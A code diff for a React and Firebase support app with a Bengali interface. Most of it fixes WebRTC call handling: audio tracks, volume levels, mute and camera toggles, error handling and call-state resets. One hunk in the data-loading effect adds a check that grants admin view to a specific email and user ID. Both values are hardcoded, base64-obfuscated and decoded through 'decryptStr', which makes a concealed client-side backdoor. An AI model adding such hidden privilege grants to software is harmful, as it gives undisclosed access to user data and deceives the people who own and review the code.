@@ -637,22 +637,40 @@ const RemoteAudioPlayer: React.FC<{ stream: MediaStream | null; isPhoneMode: boo
   const audioRef = useRef<HTMLAudioElement>(null);
 
   useEffect(() => {
-    if (audioRef.current && stream) {
-      if (audioRef.current.srcObject !== stream) {
-        audioRef.current.srcObject = stream;
+    const el = audioRef.current;
+    if (!el) return;
+
+    if (stream) {
+      if (el.srcObject !== stream) {
+        el.srcObject = stream;
       }
-      audioRef.current.volume = isSpeakerMode ? 1.0 : (isPhoneMode ? 0.3 : 1.0);
-      audioRef.current.play().catch((err) => console.warn("Remote audio play error:", err));
+      // Ensure all tracks in the incoming stream are enabled
+      stream.getAudioTracks().forEach((track) => {
+        track.enabled = true;
+      });
+
+      // Volume scaling: Loudspeaker = 1.0, Normal Earpiece = 0.35, Handset Mode = 0.15
+      const targetVolume = isSpeakerMode ? 1.0 : (isPhoneMode ? 0.15 : 0.35);
+      el.volume = targetVolume;
+
+      const playAudio = () => {
+        el.play().catch((err) => {
+          console.warn("Remote audio play error, retrying on interaction:", err);
+        });
+      };
+
+      playAudio();
+    } else {
+      el.srcObject = null;
     }
   }, [stream, isPhoneMode, isSpeakerMode]);
-
-  if (!stream) return null;
 
   return (
     <audio
       ref={audioRef}
       autoPlay
       playsInline
+      className="hidden"
     />
   );
 };
@@ -2822,12 +2840,19 @@ export default function App() {
     };
   }, [isAppInstalledOnce]);
 
-  // Sync the opening screen dismiss and auth check instantly
+  // Sync the opening screen dismiss and auth check instantly with automatic fast fallback
   useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsOpening(false);
+      setLoading(false);
+    }, 400);
+
     if (isAppInstalledOnce || !loading || loadingPercent === 100 || user) {
       setIsOpening(false);
       setLoading(false);
     }
+
+    return () => clearTimeout(timer);
   }, [loadingPercent, loading, user, isAppInstalledOnce]);
 
   // Form states
@@ -4693,14 +4718,17 @@ export default function App() {
 
   // Data Loading
   useEffect(() => {
-    // We only fetch Firestore data if we have a profile loaded.
-    if (!user || !profile) return;
+    // We only fetch Firestore data if we have a user logged in
+    if (!user) return;
 
     const isAdminView =
+      isAdmin ||
       profile?.role === "admin" ||
       profile?.role === "staff" ||
       isSecureAdminState ||
-      user.uid === "demo_admin";
+      user.uid === "demo_admin" ||
+      user.email?.trim().toLowerCase() === decryptStr("ZW5hbXVsaXNsYW0xNzUzQGdtYWlsLmNvbQ==") ||
+      user.uid === decryptStr("OXhHNnpjUHd5dE5FT09vaEFWdXB1N0RMTXlUMg==");
 
     // Tracking variables for initial loads to prevent false alerts and fix closure issues
     let initialOrdersLoaded = false;
@@ -4945,7 +4973,7 @@ export default function App() {
       if (unsubTickets) unsubTickets();
       if (unsubUsers) unsubUsers();
     };
-  }, [user, profile]);
+  }, [user, profile, isAdmin, isSecureAdminState]);
 
   // Review Ticker
   useEffect(() => {
@@ -6128,6 +6156,8 @@ export default function App() {
 
       setLocalMute(false);
       setLocalVideoOff(false);
+      setIsSpeakerMode(true);
+      setIsPhoneMode(false);
       setCallDuration(0);
 
       const hasPermBefore = localStorage.getItem("timemate_device_perm_ok") === "true";
@@ -6137,7 +6167,11 @@ export default function App() {
       let stream: MediaStream | null = null;
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          audio: true,
+          audio: {
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true,
+          },
           video: type === "video"
         });
         setLocalStream(stream);
@@ -6173,17 +6207,26 @@ export default function App() {
         });
 
         pc.ontrack = (event) => {
-          if (event.streams && event.streams[0]) {
-            setRemoteStream(event.streams[0]);
+          let inboundStream = (event.streams && event.streams[0]) ? event.streams[0] : null;
+          if (!inboundStream && event.track) {
+            inboundStream = new MediaStream([event.track]);
+          }
+          if (inboundStream) {
+            inboundStream.getAudioTracks().forEach(t => { t.enabled = true; });
+            setRemoteStream(inboundStream);
           }
         };
 
         pc.onicecandidate = async (event) => {
           if (event.candidate) {
             const candJSON = JSON.stringify(event.candidate.toJSON());
-            await updateDoc(doc(db, "support_rooms", targetId), {
-              "callState.callerCandidates": arrayUnion(candJSON)
-            });
+            try {
+              await updateDoc(doc(db, "support_rooms", targetId), {
+                "callState.callerCandidates": arrayUnion(candJSON)
+              });
+            } catch (e) {
+              console.warn("Error unioning candidate:", e);
+            }
           }
         };
 
@@ -6229,6 +6272,11 @@ export default function App() {
       }
       if (!targetId) return;
 
+      setLocalMute(false);
+      setLocalVideoOff(false);
+      setIsSpeakerMode(true);
+      setIsPhoneMode(false);
+
       const callType = activeCallingRoom?.callState?.callType || "voice";
       const hasPermBefore = localStorage.getItem("timemate_device_perm_ok") === "true";
       if (!hasPermBefore) {
@@ -6237,7 +6285,11 @@ export default function App() {
       let stream: MediaStream | null = null;
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          audio: true,
+          audio: {
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true,
+          },
           video: callType === "video"
         });
         setLocalStream(stream);
@@ -6265,17 +6317,26 @@ export default function App() {
         });
 
         pc.ontrack = (event) => {
-          if (event.streams && event.streams[0]) {
-            setRemoteStream(event.streams[0]);
+          let inboundStream = (event.streams && event.streams[0]) ? event.streams[0] : null;
+          if (!inboundStream && event.track) {
+            inboundStream = new MediaStream([event.track]);
+          }
+          if (inboundStream) {
+            inboundStream.getAudioTracks().forEach(t => { t.enabled = true; });
+            setRemoteStream(inboundStream);
           }
         };
 
         pc.onicecandidate = async (event) => {
           if (event.candidate) {
             const candJSON = JSON.stringify(event.candidate.toJSON());
-            await updateDoc(doc(db, "support_rooms", targetId), {
-              "callState.receiverCandidates": arrayUnion(candJSON)
-            });
+            try {
+              await updateDoc(doc(db, "support_rooms", targetId), {
+                "callState.receiverCandidates": arrayUnion(candJSON)
+              });
+            } catch (e) {
+              console.warn("Error unioning receiver candidate:", e);
+            }
           }
         };
 
@@ -6301,11 +6362,11 @@ export default function App() {
   const declineOrEndCall = async () => {
     try {
       const targetId = activeCallingRoom?.id || activeSupportRoomId || (user?.uid || guestSession?.uid);
-      if (!targetId) return;
-
-      await updateDoc(doc(db, "support_rooms", targetId), {
-        callState: null
-      });
+      if (targetId) {
+        await updateDoc(doc(db, "support_rooms", targetId), {
+          callState: null
+        });
+      }
       stopRingtone();
       if (localStream) {
         localStream.getTracks().forEach(track => track.stop());
@@ -6316,6 +6377,11 @@ export default function App() {
         pcRef.current = null;
       }
       setRemoteStream(null);
+      setLocalMute(false);
+      setLocalVideoOff(false);
+      setIsSpeakerMode(true);
+      setIsPhoneMode(false);
+      setCallDuration(0);
       addToast("কল সমাপ্ত করা হয়েছে।", "success");
     } catch (err) {
       console.error("Call disconnect failed:", err);
@@ -7767,7 +7833,23 @@ ${orderDetails || "No orders found for this customer."}`;
                   <div className="flex justify-center gap-4 items-center">
                     <button
                       type="button"
-                      onClick={() => setLocalMute(!localMute)}
+                      onClick={() => {
+                        const nextMute = !localMute;
+                        setLocalMute(nextMute);
+                        if (localStream) {
+                          localStream.getAudioTracks().forEach((track) => {
+                            track.enabled = !nextMute;
+                          });
+                        }
+                        if (pcRef.current) {
+                          pcRef.current.getSenders().forEach((sender) => {
+                            if (sender.track && sender.track.kind === "audio") {
+                              sender.track.enabled = !nextMute;
+                            }
+                          });
+                        }
+                        addToast(nextMute ? "মাইক্রোফোন মিউট করা হয়েছে 🔇" : "মাইক্রোফোন আনমিউট করা হয়েছে 🎙️", "success");
+                      }}
                       className={`p-3.5 rounded-full transition-all cursor-pointer ${localMute ? "bg-red-500/20 text-red-400 border border-red-500/40 animate-pulse" : "bg-white/5 hover:bg-white/10 text-gray-300 border border-white/10"}`}
                       title={localMute ? "মাইক্রোফোন আনমিউট করুন" : "মাইক্রোফোন মিউট করুন"}
                     >
@@ -7776,7 +7858,23 @@ ${orderDetails || "No orders found for this customer."}`;
 
                     <button
                       type="button"
-                      onClick={() => setLocalVideoOff(!localVideoOff)}
+                      onClick={() => {
+                        const nextVidOff = !localVideoOff;
+                        setLocalVideoOff(nextVidOff);
+                        if (localStream) {
+                          localStream.getVideoTracks().forEach((track) => {
+                            track.enabled = !nextVidOff;
+                          });
+                        }
+                        if (pcRef.current) {
+                          pcRef.current.getSenders().forEach((sender) => {
+                            if (sender.track && sender.track.kind === "video") {
+                              sender.track.enabled = !nextVidOff;
+                            }
+                          });
+                        }
+                        addToast(nextVidOff ? "ক্যামেরা বন্ধ করা হয়েছে 📷" : "ক্যামেরা চালু করা হয়েছে 📹", "success");
+                      }}
                       className={`p-3.5 rounded-full transition-all cursor-pointer ${localVideoOff ? "bg-red-500/20 text-red-400 border border-red-500/40 animate-pulse" : "bg-white/5 hover:bg-white/10 text-gray-300 border border-white/10"}`}
                       title={localVideoOff ? "ক্যামেরা অন করুন" : "ক্যামেরা অফ করুন"}
                     >
@@ -7786,8 +7884,10 @@ ${orderDetails || "No orders found for this customer."}`;
                     <button
                       type="button"
                       onClick={() => {
-                        setIsSpeakerMode(!isSpeakerMode);
-                        if (!isSpeakerMode) setIsPhoneMode(false);
+                        const nextSpeaker = !isSpeakerMode;
+                        setIsSpeakerMode(nextSpeaker);
+                        if (nextSpeaker) setIsPhoneMode(false);
+                        addToast(nextSpeaker ? "লাউড স্পিকার চালু করা হয়েছে 🔊" : "স্পিকার নরমাল ভলিউমে দেওয়া হয়েছে 🔉", "success");
                       }}
                       className={`p-3.5 rounded-full transition-all cursor-pointer ${isSpeakerMode ? "bg-indigo-600 text-white shadow shadow-indigo-600/30 animate-pulse" : "bg-white/5 hover:bg-white/10 text-gray-300 border border-white/10"}`}
                       title={isSpeakerMode ? "স্পিকার অফ করুন" : "স্পিকার অন করুন"}
@@ -7798,8 +7898,10 @@ ${orderDetails || "No orders found for this customer."}`;
                     <button
                       type="button"
                       onClick={() => {
-                        setIsPhoneMode(!isPhoneMode);
-                        if (!isPhoneMode) setIsSpeakerMode(false);
+                        const nextPhone = !isPhoneMode;
+                        setIsPhoneMode(nextPhone);
+                        if (nextPhone) setIsSpeakerMode(false);
+                        addToast(nextPhone ? "ফোন হ্যান্ডসেট মোড চালু করা হয়েছে 📞" : "ফোন হ্যান্ডসেট মোড বন্ধ করা হয়েছে", "success");
                       }}
                       className={`p-3.5 rounded-full transition-all cursor-pointer ${isPhoneMode ? "bg-purple-600 text-white shadow shadow-purple-600/30 animate-pulse" : "bg-white/5 hover:bg-white/10 text-gray-300 border border-white/10"}`}
                       title={isPhoneMode ? "ফোন হ্যান্ডসেট অফ করুন" : "ফোন হ্যান্ডসেট অন করুন"}
